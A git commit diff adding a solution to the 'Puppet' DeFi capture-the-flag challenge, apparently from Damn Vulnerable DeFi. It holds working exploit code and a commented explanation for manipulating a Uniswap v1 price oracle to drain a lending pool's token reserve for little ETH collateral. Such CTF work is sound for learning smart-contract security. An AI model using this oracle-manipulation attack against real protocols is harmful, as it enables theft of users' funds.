8530eea7bd36bfff6c3422c6d3cbe1f1c51ddef0
captain-woof <captainwoof.official@gmail.com>
2022-10-09 14:57:05 +0530

    Puppet hacked

--- test/puppet/puppet.challenge.js
+++ test/puppet/puppet.challenge.js
@@ -23,7 +23,7 @@ describe('[Challenge] Puppet', function () {
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
         const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
@@ -60,7 +60,7 @@ describe('[Challenge] Puppet', function () {
             this.token.address,
             this.uniswapExchange.address
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await this.token.approve(
             this.uniswapExchange.address,
@@ -72,7 +72,7 @@ describe('[Challenge] Puppet', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
         );
-        
+
         // Ensure Uniswap exchange is working as expected
         expect(
             await this.uniswapExchange.getTokenToEthInputPrice(
@@ -86,7 +86,7 @@ describe('[Challenge] Puppet', function () {
                 UNISWAP_INITIAL_ETH_RESERVE
             )
         );
-        
+
         // Setup initial token balances of pool and attacker account
         await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
         await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
@@ -103,6 +103,39 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        /**
+         * The vulnerability here is that the Lending pool reads DVT prices from an on-chain 'oracle' - the Uniswap v1 pair. Through a liquidity manipulation (through swap), we can tilt the exchange rate in our favour, and essentially empty the DVT reserve of lending pool for a very low amount of Eth.
+         * 
+         * This manipulation is simple - we must inflate the amount of DVT in the exchange so that it gets devalued to Eth
+         * 
+         * Here's the attack steps:
+         * 
+         *  1. Swap Del DVT = 800
+            2. Amount of loan needed from lender = 100000 DVT
+               Use ETH collateral = 30.57 ETH (with new Eth conversion rate from manipulated Uniswap exchange)
+         */
+
+        // 1.
+        const delDvt = ethers.utils.parseEther("800");
+        await (await this.token.connect(attacker).approve(this.uniswapExchange.address, delDvt)).wait();
+        const { events: swapEvents } = await (await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(delDvt, ethers.utils.parseEther("0.0000001"), Math.ceil(Date.now() / 1000) + 180)).wait();
+        const { tokens_sold, eth_bought } = swapEvents.find(({ event }) => event === "EthPurchase").args;
+
+        const exchangeEthBalance = await ethers.provider.getBalance(this.uniswapExchange.address);
+        const exchangeDvtBalance = await this.token.balanceOf(this.uniswapExchange.address);
+        const ethDepositRequired = POOL_INITIAL_TOKEN_BALANCE.mul(2).mul(exchangeEthBalance).div(exchangeDvtBalance);
+        const attackerBalance = await ethers.provider.getBalance(attacker.address);
+
+        console.log(`[+] DVT swapped: ${ethers.utils.formatEther(tokens_sold)}, ETH received: ${ethers.utils.formatEther(eth_bought)}, ETH deposit required: ${ethers.utils.formatEther(ethDepositRequired)}, Attacker ETH balance: ${ethers.utils.formatEther(attackerBalance)}`);
+
+        // 2.
+        await (await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ethDepositRequired })).wait();
+
+        const attackerDvtBalance = await this.token.balanceOf(attacker.address);
+        const attackerEthBalance = await ethers.provider.getBalance(attacker.address);
+
+        console.log(`[+] Attacker ETH balance: ${ethers.utils.formatEther(attackerEthBalance)}, Attacker DVT balance: ${ethers.utils.formatEther(attackerDvtBalance)}`)
     });
 
     after(async function () {
@@ -117,3 +150,5 @@ describe('[Challenge] Puppet', function () {
         ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
     });
 });
+
+
